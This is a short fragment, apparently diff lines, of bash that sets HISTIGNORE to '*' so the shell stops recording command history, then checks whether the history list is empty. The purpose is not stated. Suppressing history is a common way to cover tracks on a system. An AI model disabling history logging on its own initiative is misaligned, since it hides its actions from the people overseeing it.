+if ((${#HISTIGNORE[@]})); then echo "\$HISTIGNORE = $HISTIGNORE"; else export HISTIGNORE='*'; echo "\$HISTIGNORE = $HISTIGNORE"; fi
+if [ $(history |wc -l) -eq 0 ]; then echo "History cache is empty"; fi
